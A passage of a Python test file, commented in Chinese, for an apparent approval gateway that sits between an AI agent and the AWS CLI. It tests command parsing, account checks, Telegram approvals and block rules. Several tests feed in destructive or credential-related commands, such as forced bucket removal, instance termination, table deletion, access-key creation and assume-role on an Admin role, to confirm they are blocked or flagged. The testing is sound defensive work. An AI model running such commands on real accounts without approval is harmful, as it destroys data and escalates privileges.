            'aws lambda invoke --cli-input-json {"FunctionName":"my func","Runtime":"python3.12"}')
        idx = result.index('--cli-input-json') + 1
        assert result[idx] == '{"FunctionName":"my func","Runtime":"python3.12"}'

    def test_nested_json(self, app_module):
        result = app_module.aws_cli_split(
            'aws dynamodb query --table-name t --expression-attribute-values {":v":{"S":"hello world"}}')
        idx = result.index('--expression-attribute-values') + 1
        assert result[idx] == '{":v":{"S":"hello world"}}'

    def test_json_with_quotes(self, app_module):
        result = app_module.aws_cli_split(
            '''aws secretsmanager create-secret --name test --generate-secret-string '{"PasswordLength":32}' ''')
        idx = result.index('--generate-secret-string') + 1
        assert result[idx] == '{"PasswordLength":32}'

    def test_array_json(self, app_module):
        result = app_module.aws_cli_split(
            'aws ec2 run-instances --tag-specifications [{"ResourceType":"instance","Tags":[{"Key":"Name","Value":"test"}]}]')
        idx = result.index('--tag-specifications') + 1
        assert result[idx] == '[{"ResourceType":"instance","Tags":[{"Key":"Name","Value":"test"}]}]'

    def test_policy_document_nested(self, app_module):
        result = app_module.aws_cli_split(
            'aws iam put-role-policy --role-name r --policy-name p --policy-document {"Version":"2012-10-17","Statement":[{"Effect":"Allow"}]}')
        idx = result.index('--policy-document') + 1
        assert result[idx] == '{"Version":"2012-10-17","Statement":[{"Effect":"Allow"}]}'

    # --- JMESPath --query ---

    def test_simple_query(self, app_module):
        result = app_module.aws_cli_split(
            "aws ec2 describe-instances --query Reservations[*].Instances[*].InstanceId")
        idx = result.index('--query') + 1
        assert result[idx] == "Reservations[*].Instances[*].InstanceId"

    def test_query_backtick(self, app_module):
        result = app_module.aws_cli_split(
            "aws dynamodb scan --table-name t --query Items[?name==`foo`]")
        idx = result.index('--query') + 1
        assert result[idx] == "Items[?name==`foo`]"

    def test_query_contains_comma_space(self, app_module):
        """原始 bug：contains() 帶逗號+空格"""
        result = app_module.aws_cli_split(
            "aws cloudfront list-distributions --query DistributionList.Items[?contains(Aliases.Items, `files.ztp.one`)]")
        idx = result.index('--query') + 1
        assert result[idx] == "DistributionList.Items[?contains(Aliases.Items, `files.ztp.one`)]"

    def test_query_double_quoted(self, app_module):
        result = app_module.aws_cli_split(
            'aws cloudfront list-distributions --query "DistributionList.Items[?contains(Aliases.Items, `files.ztp.one`)]"')
        idx = result.index('--query') + 1
        assert result[idx] == "DistributionList.Items[?contains(Aliases.Items, `files.ztp.one`)]"

    def test_query_backtick_with_space(self, app_module):
        result = app_module.aws_cli_split(
            "aws dynamodb scan --table-name t --query Items[?title==`hello world`]")
        idx = result.index('--query') + 1
        assert result[idx] == "Items[?title==`hello world`]"

    def test_query_multiple_functions(self, app_module):
        result = app_module.aws_cli_split(
            "aws dynamodb scan --table-name t --query Items[?contains(name, `foo`) && contains(type, `bar`)]")
        idx = result.index('--query') + 1
        assert result[idx] == "Items[?contains(name, `foo`) && contains(type, `bar`)]"

    def test_query_join_function(self, app_module):
        result = app_module.aws_cli_split(
            "aws ec2 describe-instances --query join(`, `, Reservations[*].Instances[*].InstanceId)")
        idx = result.index('--query') + 1
        assert result[idx] == "join(`, `, Reservations[*].Instances[*].InstanceId)"

    def test_query_sort_by_with_braces(self, app_module):
        result = app_module.aws_cli_split(
            "aws ec2 describe-instances --query sort_by(Reservations[*].Instances[*], &LaunchTime)[*].{Id: InstanceId, Time: LaunchTime}")
        idx = result.index('--query') + 1
        assert result[idx] == "sort_by(Reservations[*].Instances[*], &LaunchTime)[*].{Id: InstanceId, Time: LaunchTime}"

    def test_query_followed_by_output(self, app_module):
        result = app_module.aws_cli_split(
            "aws ec2 describe-instances --query sort_by(Reservations[*].Instances[*], &LaunchTime) --output text")
        idx = result.index('--query') + 1
        assert result[idx] == "sort_by(Reservations[*].Instances[*], &LaunchTime)"
        assert "--output" in result
        assert "text" in result

    def test_query_braces_pipe_followed_by_output(self, app_module):
        result = app_module.aws_cli_split(
            "aws ec2 describe-instances --query Reservations[*].{Id: InstanceId, Name: Tags[?Key==`Name`].Value | [0]} --output table")
        idx = result.index('--query') + 1
        assert result[idx] == "Reservations[*].{Id: InstanceId, Name: Tags[?Key==`Name`].Value | [0]}"
        assert "--output" in result

    # --- filters ---

    def test_filters_multiple_values(self, app_module):
        result = app_module.aws_cli_split(
            "aws ec2 describe-instances --filters Name=instance-state-name,Values=running Name=tag:Name,Values=web")
        idx = result.index('--filters') + 1
        assert result[idx] == "Name=instance-state-name,Values=running"
        assert result[idx + 1] == "Name=tag:Name,Values=web"

    # --- 無引號空格（正確行為：斷開） ---

    def test_unquoted_message_splits(self, app_module):
        result = app_module.aws_cli_split("aws sns publish --topic-arn X --message Hello World")
        assert result == ["aws", "sns", "publish", "--topic-arn", "X", "--message", "Hello", "World"]

    # --- 混合 ---

    def test_mixed_json_query_output(self, app_module):
        result = app_module.aws_cli_split(
            'aws dynamodb query --table-name t --key-condition-expression "pk=:v" --expression-attribute-values {":v":{"S":"test"}} --query Items[?contains(name, `foo`)] --output json')
        assert result[result.index('--key-condition-expression') + 1] == "pk=:v"
        assert result[result.index('--expression-attribute-values') + 1] == '{":v":{"S":"test"}}'
        assert result[result.index('--query') + 1] == "Items[?contains(name, `foo`)]"
        assert result[result.index('--output') + 1] == "json"

    # --- 邊界案例 ---

    def test_empty_string(self, app_module):
        assert app_module.aws_cli_split("") == []

    def test_aws_only(self, app_module):
        assert app_module.aws_cli_split("aws") == ["aws"]

    def test_unpaired_quote_graceful(self, app_module):
        """未配對引號不應 crash"""
        result = app_module.aws_cli_split('aws sns publish --message "hello world')
        assert "hello world" in result

    def test_unpaired_bracket_graceful(self, app_module):
        """未配對括號不應 crash"""
        result = app_module.aws_cli_split('aws ddb query --eav {":v":{"S":"test"}')
        assert any('{' in t for t in result)


# ============================================================================
# Accounts 模組測試
# ============================================================================

class TestAccounts:
    """帳號管理模組測試"""
    
    def test_validate_account_id_valid(self, app_module):
        """有效的 12 位帳號 ID"""
        valid, error = app_module.validate_account_id('123456789012')
        assert valid is True
        assert error is None
    
    def test_validate_account_id_empty(self, app_module):
        """空帳號 ID"""
        valid, error = app_module.validate_account_id('')
        assert valid is False
        assert '不能為空' in error
    
    def test_validate_account_id_not_digit(self, app_module):
        """非數字帳號 ID"""
        valid, error = app_module.validate_account_id('abc123456789')
        assert valid is False
        assert '數字' in error
    
    def test_validate_account_id_wrong_length(self, app_module):
        """長度不對的帳號 ID"""
        valid, error = app_module.validate_account_id('12345')
        assert valid is False
        assert '12 位' in error
    
    def test_validate_role_arn_empty(self, app_module):
        """空 Role ARN（允許）"""
        valid, error = app_module.validate_role_arn('')
        assert valid is True
        assert error is None
    
    def test_validate_role_arn_none(self, app_module):
        """None Role ARN（允許）"""
        valid, error = app_module.validate_role_arn(None)
        assert valid is True
        assert error is None
    
    def test_validate_role_arn_valid(self, app_module):
        """有效的 Role ARN"""
        valid, error = app_module.validate_role_arn('arn:aws:iam::123456789012:role/MyRole')
        assert valid is True
        assert error is None
    
    def test_validate_role_arn_invalid_prefix(self, app_module):
        """無效前綴"""
        valid, error = app_module.validate_role_arn('invalid:arn')
        assert valid is False
        assert 'arn:aws:iam' in error
    
    def test_validate_role_arn_missing_role(self, app_module):
        """缺少 :role/"""
        valid, error = app_module.validate_role_arn('arn:aws:iam::123456789012:user/MyUser')
        assert valid is False
        assert ':role/' in error


# ============================================================================
# Trust 模組測試（補充）
# ============================================================================

class TestTrustExcluded:
    """Trust 排除規則測試"""
    
    def test_is_trust_excluded_iam(self, app_module):
        """IAM 命令應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws iam create-user --user-name test') is True
    
    def test_is_trust_excluded_kms(self, app_module):
        """KMS 命令應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws kms create-key') is True
    
    def test_is_trust_excluded_delete(self, app_module):
        """delete 操作應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws s3 rm s3://bucket/key') is True
        assert is_trust_excluded('aws ec2 delete-security-group --group-id sg-123') is True
    
    def test_is_trust_excluded_terminate(self, app_module):
        """terminate 操作應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws ec2 terminate-instances --instance-ids i-123') is True
    
    def test_is_trust_excluded_force_flag(self, app_module):
        """--force 旗標應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws s3 rb s3://bucket --force') is True
    
    def test_is_trust_excluded_safe_command(self, app_module):
        """安全命令不應被排除"""
        from trust import is_trust_excluded
        assert is_trust_excluded('aws s3 ls') is False
        assert is_trust_excluded('aws ec2 describe-instances') is False


# ============================================================================
# Telegram 模組測試
# ============================================================================

class TestTelegramModule:
    """Telegram 模組測試"""
    
    def test_escape_markdown_special_chars(self, app_module):
        """Markdown 特殊字元跳脫（用 zero-width space 斷開配對）"""
        from telegram import escape_markdown
        zwsp = '\u200b'
        assert escape_markdown('*bold*') == f'*{zwsp}bold*{zwsp}'
        assert escape_markdown('_italic_') == f'_{zwsp}italic_{zwsp}'
        assert escape_markdown('`code`') == f'`{zwsp}code`{zwsp}'
        assert escape_markdown('[link') == f'[{zwsp}link'
    
    def test_escape_markdown_none(self, app_module):
        """None 輸入應返回 None"""
        from telegram import escape_markdown
        assert escape_markdown(None) is None
    
    def test_escape_markdown_empty(self, app_module):
        """空字串應返回空字串"""
        from telegram import escape_markdown
        assert escape_markdown('') == ''
    
    def test_escape_markdown_no_special(self, app_module):
        """無特殊字元不變"""
        from telegram import escape_markdown
        assert escape_markdown('hello world') == 'hello world'
    
    def test_telegram_requests_parallel_empty(self, app_module):
        """空請求列表"""
        from telegram import _telegram_requests_parallel
        result = _telegram_requests_parallel([])
        assert result == []


# ============================================================================
# Paging 模組測試（補充）
# ============================================================================

class TestPagingModule:
    """Paging 模組測試"""
    
    def test_store_paged_output_short(self, app_module):
        """短輸出不分頁"""
        result = app_module.store_paged_output('test-req-1', 'short output')
        assert result['paged'] is False
        assert result['result'] == 'short output'
    
    def test_store_paged_output_long(self, app_module):
        """長輸出分頁"""
        long_output = 'x' * 5000  # 超過 OUTPUT_MAX_INLINE
        result = app_module.store_paged_output('test-req-2', long_output)
        assert result['paged'] is True
        assert result['page'] == 1
        assert result['total_pages'] >= 2


# ============================================================================
# Commands 模組測試（補充）
# ============================================================================

class TestCommandsModule:
    """Commands 模組測試"""
    
    def test_is_blocked_iam_delete(self, app_module):
        """IAM 刪除應被封鎖"""
        from commands import is_blocked
        assert is_blocked('aws iam delete-user --user-name test') is True
    
    def test_is_blocked_query_safe(self, app_module):
        """--query 參數中的特殊字元不應觸發封鎖"""
        from commands import is_blocked
        # 這個查詢包含反引號但不應被封鎖
        assert is_blocked("aws ec2 describe-instances --query 'Reservations[*].Instances[*]'") is False
    
    def test_is_dangerous_s3_rb(self, app_module):
        """s3 rb 應是高危"""
        from commands import is_dangerous
        assert is_dangerous('aws s3 rb s3://bucket') is True
    
    def test_is_dangerous_terminate(self, app_module):
        """terminate-instances 應是高危"""
        from commands import is_dangerous
        assert is_dangerous('aws ec2 terminate-instances --instance-ids i-123') is True
    
    def test_is_auto_approve_describe(self, app_module):
        """describe 命令應自動批准"""
        from commands import is_auto_approve
        assert is_auto_approve('aws ec2 describe-instances') is True
        assert is_auto_approve('aws rds describe-db-instances') is True
    
    def test_is_auto_approve_write(self, app_module):
        """寫入命令不應自動批准"""
        from commands import is_auto_approve
        assert is_auto_approve('aws ec2 run-instances') is False
        assert is_auto_approve('aws s3 cp file s3://bucket/') is False


# ============================================================================
# MCP Tool Handlers 測試（補充）
# ============================================================================

class TestMCPToolStatus:
    """bouncer_status MCP tool 測試"""
    
    def test_status_missing_request_id(self, app_module):
        """缺少 request_id"""
        result = app_module.mcp_tool_status('test-1', {})
        assert 'error' in str(result).lower() or 'missing' in str(result).lower()


class TestMCPToolGetPage:
    """bouncer_get_page MCP tool 測試"""
    
    def test_get_page_missing_request_id(self, app_module):
        """缺少 request_id"""
        result = app_module.mcp_tool_get_page('test-1', {'page': 2})
        assert 'error' in str(result).lower() or 'missing' in str(result).lower()


class TestMCPToolExecuteEdgeCases:
    """bouncer_execute 邊界情況測試"""
    
    def test_execute_empty_command(self, app_module):
        """空命令"""
        result = app_module.mcp_tool_execute('test-1', {'command': ''})
        assert 'error' in str(result).lower()
    
    def test_execute_whitespace_command(self, app_module):
        """只有空白的命令"""
        result = app_module.mcp_tool_execute('test-1', {'command': '   '})
        assert 'error' in str(result).lower()


# ============================================================================
# Telegram Command Handlers 測試
# ============================================================================

class TestTelegramCommands:
    """Telegram 命令處理測試"""
    
    def test_handle_accounts_command(self, app_module):
        """測試 /accounts 命令"""
        with patch.object(app_module, 'list_accounts', return_value=[
            {'account_id': '123456789012', 'name': 'Test', 'enabled': True}
        ]), patch('telegram_commands.send_telegram_message_to'):
            result = app_module.handle_accounts_command('12345')
            assert result['statusCode'] == 200
    
    def test_handle_help_command(self, app_module):
        """測試 /help 命令"""
        with patch('telegram_commands.send_telegram_message_to'):
            result = app_module.handle_help_command('12345')
            assert result['statusCode'] == 200


# ============================================================================
# HMAC 驗證測試
# ============================================================================

class TestHMACVerification:
    """HMAC 驗證測試"""
    
    def test_verify_hmac_missing_header(self, app_module):
        """缺少 HMAC header"""
        with patch('app.ENABLE_HMAC', True):
            result = app_module.verify_hmac({}, 'body')
            assert result is False
    
    def test_verify_hmac_with_empty_timestamp(self, app_module):
        """空 timestamp"""
        with patch('app.ENABLE_HMAC', True):
            result = app_module.verify_hmac({'x-timestamp': ''}, 'body')
            assert result is False


# ============================================================================
# Lambda Handler 測試
# ============================================================================

class TestLambdaHandler:
    """Lambda handler 測試"""
    
    def test_handler_health_check(self, app_module):
        """健康檢查"""
        event = {'httpMethod': 'GET', 'path': '/prod/health'}
        result = app_module.lambda_handler(event, None)
        assert result['statusCode'] == 200
    
    def test_handler_unknown_path(self, app_module):
        """未知路徑"""
        event = {'httpMethod': 'GET', 'path': '/unknown/path', 'headers': {}}
        result = app_module.lambda_handler(event, None)
        # 可能返回 404 或其他錯誤
        assert 'statusCode' in result


# ============================================================================
# Helper Functions 測試
# ============================================================================

class TestHelperFunctions:
    """輔助函數測試"""
    
    def test_get_header_case_insensitive(self, app_module):
        """get_header 大小寫不敏感"""
        headers = {'Content-Type': 'application/json'}
        assert app_module.get_header(headers, 'content-type') == 'application/json'
        assert app_module.get_header(headers, 'CONTENT-TYPE') == 'application/json'
    
    def test_get_header_not_found(self, app_module):
        """get_header 找不到返回 None"""
        headers = {'X-Custom': 'value'}
        assert app_module.get_header(headers, 'X-Missing') is None
    
    def test_get_header_empty_dict(self, app_module):
        """get_header 空 dict"""
        assert app_module.get_header({}, 'any') is None


# ============================================================================
# MCP Result/Error 格式測試
# ============================================================================

class TestMCPFormatting:
    """MCP 結果格式測試"""
    
    def test_mcp_result_format(self, app_module):
        """mcp_result 格式正確"""
        result = app_module.mcp_result('test-123', {'test': 'data'})
        assert result['statusCode'] == 200
        body = json.loads(result['body'])
        assert body['jsonrpc'] == '2.0'
        assert body['id'] == 'test-123'
        assert 'result' in body
    
    def test_mcp_error_format(self, app_module):
        """mcp_error 格式正確"""
        result = app_module.mcp_error('test-123', -32600, 'Invalid request')
        assert result['statusCode'] == 200
        body = json.loads(result['body'])
        assert body['jsonrpc'] == '2.0'
        assert body['id'] == 'test-123'
        assert body['error']['code'] == -32600
        assert body['error']['message'] == 'Invalid request'


# ============================================================================
# Telegram Webhook Handler 測試
# ============================================================================

class TestTelegramWebhookHandler:
    """Telegram webhook 處理測試"""
    
    def test_handle_telegram_webhook_empty_update(self, app_module):
        """空 update"""
        event = {'body': '{}'}
        result = app_module.handle_telegram_webhook(event)
        assert result['statusCode'] == 200
    
    def test_handle_telegram_webhook_with_message(self, app_module):
        """有 message 的 update"""
        event = {'body': json.dumps({
            'message': {
                'chat': {'id': 123},
                'text': 'hello'
            }
        })}
        with patch('telegram_commands.send_telegram_message_to'):
            result = app_module.handle_telegram_webhook(event)
            assert result['statusCode'] == 200


class TestTelegramCommandHandler:
    """Telegram 命令處理測試"""
    
    def test_handle_telegram_command_no_text(self, app_module):
        """無 text 欄位"""
        result = app_module.handle_telegram_command({'chat': {'id': 123}})
        assert result['statusCode'] == 200
    
    def test_handle_telegram_command_unknown(self, app_module):
        """未知命令"""
        with patch('telegram_commands.send_telegram_message_to'):
            result = app_module.handle_telegram_command({
                'chat': {'id': 123},
                'text': '/unknown'
            })
            assert result['statusCode'] == 200


# ============================================================================
# MCP Tool Call Routing 測試
# ============================================================================

class TestMCPToolCallRouting:
    """MCP tool call 路由測試"""
    
    def test_handle_mcp_tool_call_execute(self, app_module):
        """bouncer_execute 路由"""
        mock_handler = MagicMock(return_value={'test': 'result'})
        with patch.dict(app_module.TOOL_HANDLERS, {'bouncer_execute': mock_handler}):
            result = app_module.handle_mcp_tool_call('req-1', 'bouncer_execute', {'command': 'aws s3 ls'})
            assert result == {'test': 'result'}
    
    def test_handle_mcp_tool_call_status(self, app_module):
        """bouncer_status 路由"""
        mock_handler = MagicMock(return_value={'test': 'result'})
        with patch.dict(app_module.TOOL_HANDLERS, {'bouncer_status': mock_handler}):
            result = app_module.handle_mcp_tool_call('req-1', 'bouncer_status', {'request_id': 'abc'})
            assert result == {'test': 'result'}
    
    def test_handle_mcp_tool_call_unknown(self, app_module):
        """未知 tool"""
        result = app_module.handle_mcp_tool_call('req-1', 'unknown_tool', {})
        body = json.loads(result['body'])
        assert 'error' in body


# ============================================================================
# Trust Command Handler 測試
# ============================================================================

class TestTrustCommandHandler:
    """Trust 命令處理測試"""
    
    def test_handle_trust_command(self, app_module):
        """trust 命令"""
        with patch('telegram_commands.send_telegram_message_to'):
            result = app_module.handle_trust_command('12345')
            assert result['statusCode'] == 200


class TestPendingCommandHandler:
    """Pending 命令處理測試"""
    
    def test_handle_pending_command_empty(self, app_module):
        """無 pending 請求"""
        with patch.object(app_module.table, 'query', return_value={'Items': []}), \
             patch('telegram_commands.send_telegram_message_to'):
            result = app_module.handle_pending_command('12345')
            assert result['statusCode'] == 200


# ============================================================================
# MCP Request Handler 測試
# ============================================================================

class TestMCPRequestHandler:
    """MCP 請求處理測試"""
    
    def test_handle_mcp_request_initialize(self, app_module):
        """initialize 方法"""
        event = {
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'initialize',
                'params': {}
            }),
            'headers': {'x-approval-secret': 'test-secret'}
        }
        with patch.object(app_module, 'REQUEST_SECRET', 'test-secret'):
            result = app_module.handle_mcp_request(event)
            assert result['statusCode'] == 200
    
    def test_handle_mcp_request_tools_list(self, app_module):
        """tools/list 方法"""
        event = {
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/list'
            }),
            'headers': {'x-approval-secret': 'test-secret'}
        }
        with patch.object(app_module, 'REQUEST_SECRET', 'test-secret'):
            result = app_module.handle_mcp_request(event)
            assert result['statusCode'] == 200
            body = json.loads(result['body'])
            assert 'tools' in body.get('result', {})


# ============================================================================
# REST API Handler 測試
# ============================================================================

class TestRESTHandler:
    """REST API 處理測試"""
    
    def test_handle_clawdbot_request_blocked(self, app_module):
        """被封鎖的命令"""
        event = {
            'body': json.dumps({
                'command': 'aws iam delete-user --user-name test',
                'reason': 'test'
            })
        }
        result = app_module.handle_clawdbot_request(event)
        assert result['statusCode'] == 403
    
    def test_handle_clawdbot_request_empty_body(self, app_module):
        """空 body"""
        event = {'body': '{}'}
        result = app_module.handle_clawdbot_request(event)
        # 空命令應該返回錯誤
        assert result['statusCode'] in [400, 403]


# ============================================================================
# Command Classification 邊界測試
# ============================================================================

class TestCommandClassificationEdgeCases:
    """命令分類邊界測試"""
    
    def test_classify_non_aws_command(self, app_module):
        """非 AWS 命令"""
        from commands import is_blocked, is_dangerous, is_auto_approve
        assert is_blocked('ls -la') is False
        assert is_dangerous('ls -la') is False
        assert is_auto_approve('ls -la') is False
    
    def test_classify_dangerous_patterns(self, app_module):
        """各種高危模式"""
        from commands import is_dangerous
        assert is_dangerous('aws rds delete-db-instance --db-instance-identifier test') is True
        assert is_dangerous('aws lambda delete-function --function-name test') is True
        assert is_dangerous('aws dynamodb delete-table --table-name test') is True
    
    def test_classify_s3_operations(self, app_module):
        """S3 操作分類"""
        from commands import is_auto_approve, is_dangerous
        assert is_auto_approve('aws s3 ls') is True
        assert is_auto_approve('aws s3 ls s3://bucket') is True
        assert is_dangerous('aws s3 rb s3://bucket') is True


# ============================================================================
# aws_cli_split 邊界測試（補充）
# ============================================================================

class TestAwsCliSplitEdgeCases:
    """aws_cli_split 邊界測試"""
    
    def test_empty_command(self, app_module):
        """空命令"""
        result = app_module.aws_cli_split('')
        assert result == []
    
    def test_no_json_parameter(self, app_module):
        """無 JSON 參數"""
        result = app_module.aws_cli_split('aws s3 ls')
        assert result == ['aws', 's3', 'ls']
    
    def test_malformed_json(self, app_module):
        """格式錯誤的 JSON（未配對括號）不應 crash"""
        result = app_module.aws_cli_split("aws dynamodb query --key '{invalid'")
        assert '--key' in result or any('invalid' in t for t in result)


# ============================================================================
# send_approval_request 測試
# ============================================================================

class TestSendApprovalRequest:
    """審批請求發送測試"""
    
    def test_send_approval_request_blocked(self, app_module):
        """被封鎖的命令"""
        with patch.object(app_module.table, 'put_item'):
            result = app_module.send_approval_request(
                request_id='test-123',
                command='aws iam create-access-key',
                reason='test'
            )
            # 封鎖的命令不會成功
            assert result is None or result.get('status') == 'blocked'


# ============================================================================
# execute_command 測試
# ============================================================================

class TestExecuteCommand:
    """命令執行測試"""
    
    def test_execute_command_format(self, app_module):
        """execute_command 返回格式"""
        # 測試函數存在且可呼叫
        assert callable(app_module.execute_command)


# ============================================================================
# Status Query 測試（補充）
# ============================================================================

class TestStatusQueryEdgeCases:
    """Status 查詢邊界測試"""
    
    def test_handle_status_query_function_exists(self, app_module):
        """handle_status_query 函數存在"""
        assert callable(app_module.handle_status_query)


# ============================================================================
# Rate Limit 測試（補充）
# ============================================================================

class TestRateLimitEdgeCases:
    """Rate limit 邊界測試"""
    
    def test_check_rate_limit_new_source(self, app_module):
        """新 source 不應被限制"""
        import uuid
        unique_source = f'test-source-{uuid.uuid4()}'
        try:
            app_module.check_rate_limit(unique_source)
        except Exception as e:
            # 可能因為 DynamoDB 查詢失敗，但不應該是 rate limit 錯誤
            assert 'rate' not in str(e).lower() or 'limit' not in str(e).lower()


# ============================================================================
# Constants 驗證測試
# ============================================================================

class TestConstants:
    """常數驗證測試"""
    
    def test_blocked_patterns_not_empty(self, app_module):
        """BLOCKED_PATTERNS 不應為空"""
        from constants import BLOCKED_PATTERNS
        assert len(BLOCKED_PATTERNS) > 0
    
    def test_auto_approve_prefixes_not_empty(self, app_module):
        """AUTO_APPROVE_PREFIXES 不應為空"""
        from constants import AUTO_APPROVE_PREFIXES
        assert len(AUTO_APPROVE_PREFIXES) > 0
    
    def test_dangerous_patterns_not_empty(self, app_module):
        """DANGEROUS_PATTERNS 不應為空"""
        from constants import DANGEROUS_PATTERNS
        assert len(DANGEROUS_PATTERNS) > 0


# ============================================================================
# Account Validation Error Paths 測試 (562-592)
# ============================================================================

class TestAccountValidationErrorPaths:
    """帳號驗證錯誤路徑測試"""
    
    def test_execute_invalid_account_id_format(self, app_module):
        """帳號 ID 格式錯誤"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws s3 ls',
                        'trust_scope': 'test-session',
                        'account': 'invalid'  # 非 12 位數字 (注意：參數名是 account 不是 account_id)
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        assert 'result' in body
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'error'
        assert '12 位' in content['error'] or '數字' in content['error']
        assert body['result'].get('isError', False) == True
    
    def test_execute_account_not_configured(self, app_module):
        """帳號未配置"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws s3 ls',
                        'trust_scope': 'test-session',
                        'account': '999999999999'  # 不存在的帳號
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        # Mock get_account 返回 None
        with patch('accounts.get_account', return_value=None), \
             patch.object(app_module, 'list_accounts', return_value=[{'account_id': '123456789012'}]):
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            
            assert 'result' in body
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'error'
            assert '未配置' in content['error']
            assert 'available_accounts' in content
            assert body['result'].get('isError', False) == True
    
    def test_execute_account_disabled(self, app_module):
        """帳號已停用"""
        import mcp_tools
        import mcp_execute
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws s3 ls',
                        'trust_scope': 'test-session',
                        'account': '123456789012'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        # Mock get_account 返回停用的帳號
        with patch.object(mcp_execute, 'get_account', return_value={
            'account_id': '123456789012',
            'name': 'Test',
            'enabled': False
        }):
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            
            assert 'result' in body
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'error'
            assert '停用' in content['error']
            assert body['result'].get('isError', False) == True


# ============================================================================
# BLOCKED Command Path 測試 (627-631)
# ============================================================================

class TestBlockedCommandPath:
    """BLOCKED 命令路徑測試"""
    
    def test_blocked_command_returns_error(self, app_module):
        """BLOCKED 命令應返回 isError"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws iam create-access-key --user-name admin',
                        'trust_scope': 'test-session',
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'blocked'
        assert body['result']['isError'] == True
    
    def test_blocked_assume_role(self, app_module):
        """sts assume-role 應該被封鎖"""
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws sts assume-role --role-arn arn:aws:iam::123456789012:role/Admin',
                        'trust_scope': 'test-session',
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        result = app_module.lambda_handler(event, None)
        body = json.loads(result['body'])
        
        content = json.loads(body['result']['content'][0]['text'])
        assert content['status'] == 'blocked'


# ============================================================================
# Rate Limit / Pending Limit 錯誤測試 (674-707)
# ============================================================================

class TestRateLimitErrors:
    """Rate Limit 錯誤路徑測試"""
    
    def test_rate_limit_exceeded_error(self, app_module):
        """Rate limit 超過應返回錯誤"""
        import mcp_tools
        import mcp_execute
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws ec2 start-instances --instance-ids i-123',
                        'trust_scope': 'test-session',
                        'source': 'test-source'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        # Mock check_rate_limit 拋出 RateLimitExceeded
        with patch.object(mcp_execute, 'check_rate_limit', 
                          side_effect=mcp_execute.RateLimitExceeded('Rate limit exceeded')):
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'rate_limited'
            assert body['result']['isError'] == True
    
    def test_pending_limit_exceeded_error(self, app_module):
        """Pending limit 超過應返回錯誤"""
        import mcp_tools
        event = {
            'rawPath': '/mcp',
            'headers': {'x-approval-secret': 'test-secret'},
            'body': json.dumps({
                'jsonrpc': '2.0',
                'id': 'test-1',
                'method': 'tools/call',
                'params': {
                    'name': 'bouncer_execute',
                    'arguments': {
                        'command': 'aws ec2 start-instances --instance-ids i-123',
                        'trust_scope': 'test-session',
                        'source': 'test-source'
                    }
                }
            }),
            'requestContext': {'http': {'method': 'POST'}}
        }
        
        # Mock check_rate_limit 拋出 PendingLimitExceeded
        with patch('mcp_execute.check_rate_limit',
                          side_effect=app_module.PendingLimitExceeded('Too many pending')):
            result = app_module.lambda_handler(event, None)
            body = json.loads(result['body'])
            
            content = json.loads(body['result']['content'][0]['text'])
            assert content['status'] == 'pending_limit_exceeded'
            assert 'hint' in content


# ============================================================================
# Telegram Callback Handlers 測試 (796-1114)
# ============================================================================

class TestTelegramCallbackHandlers:
    """Telegram callback handlers 測試"""
    
    @patch('app.answer_callback')
    @patch('app.update_message')
    def test_callback_revoke_trust_success(self, mock_update, mock_answer, app_module):
        """撤銷信任時段成功"""
        trust_id = 'trust-123'
        
        # 先建立信任時段
        app_module.table.put_item(Item={
            'request_id': trust_id,
            'type': 'trust_session',
            'source': 'test-source',
            'trust_scope': 'test-source',
            'expires_at': int(time.time()) + 600
        })
        
        event = {
            'rawPath': '/webhook',
            'headers': {},
            'body': json.dumps({
                'callback_query': {
